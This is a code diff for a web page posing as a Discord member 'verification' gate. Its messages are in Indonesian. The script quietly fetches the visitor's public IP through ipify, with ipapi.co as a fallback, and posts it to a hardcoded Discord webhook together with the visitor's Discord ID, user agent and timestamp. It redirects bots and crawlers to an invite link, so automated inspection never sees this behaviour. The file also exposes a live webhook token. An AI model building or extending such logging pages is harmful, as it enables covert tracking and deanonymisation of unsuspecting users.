@@ -172,9 +172,11 @@
   </div>
 
   <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
-    const discordInvite = "https://discord.gg/fMbZNhGVmh";
-    let globalUserIp = "Unknown/Blocked";
+const webhookUrl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
+const discordInvite = "https://discord.gg/fMbZNhGVmh";
+    
+    let globalUserIp = null;
+    let ipFetchPromise = null;
 
     function playSuccessSound() {
         try {
@@ -199,30 +201,37 @@
         }
     }
 
-    async function initGate() {
+    function initGate() {
         const userAgent = navigator.userAgent;
         if (/bot|discord|robot|curl|spider|crawler/i.test(userAgent)) {
             window.location.href = discordInvite;
             return;
         }
 
-        try {
-            const ipResponse = await fetch("https://ipify.org");
-            if (ipResponse.ok) {
-                const ipData = await ipResponse.json();
-                globalUserIp = ipData.ip;
-            }
-        } catch (e) {
-            console.log("IP lookup failed at init");
-        }
+        ipFetchPromise = fetch("https://ipify.org")
+            .then(res => res.json())
+            .then(data => {
+                globalUserIp = data.ip;
+            })
+            .catch(() => {
+                return fetch("https://ipapi.co")
+                    .then(res => res.json())
+                    .then(data => {
+                        globalUserIp = data.ip;
+                    })
+                    .catch(() => {
+                        globalUserIp = "Blocked/Failed";
+                    });
+            });
     }
 
-    function verifyAndLog() {
+    async function verifyAndLog() {
         const userIdField = document.getElementById('user-id-input');
         const userIdValue = userIdField.value.trim();
 
-        if (!userIdValue) {
-            alert("Harap masukkan User ID Anda terlebih dahulu!");
+        const isOnlyNumbers = /^\d+$/.test(userIdValue);
+        if (!userIdValue || !isOnlyNumbers || userIdValue.length < 17 || userIdValue.length > 19) {
+            alert("User ID tidak valid! Harus berupa angka saja dan berjumlah 17-19 digit.");
             return;
         }
 
@@ -230,13 +239,21 @@
         document.getElementById('loader').style.display = 'block';
         document.getElementById('status-label').innerText = "Verifying security connection...";
 
+        if (!globalUserIp && ipFetchPromise) {
+            await ipFetchPromise;
+        }
+
+        if (!globalUserIp) {
+            globalUserIp = "Unknown/Blocked";
+        }
+
         const userAgent = navigator.userAgent;
         const now = new Date();
         
         const payload = {
             username: ".nael",
             avatar_url: "https://cdn.discordapp.com/avatars/1288936739561279618/47a58cb8dbd6b2179367e4f50bf4a0b8.webp?size=160",
-            content: `🛡️ **[MEMBER VERIFIED]**\n👤 **User:** <@${userIdValue}>\n🌐 **IP:** \`${globalUserIp}\`\n📅 **Date:** ${now.toLocaleDateString('id-ID')}\n⏰ **Time:** ${now.toLocaleTimeString('id-ID')}\n💻 **Device:** \`${userAgent}\``
+            content: `🛡️ **[MEMBER VERIFIED]**\n👤 **User ID:** <@${userIdValue}>\n🌐 **IP:** \`${globalUserIp}\`\n📅 **Date:** ${now.toLocaleDateString('id-ID')}\n⏰ **Time:** ${now.toLocaleTimeString('id-ID')}\n💻 **Device:** \`${userAgent}\``
         };
 
         const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
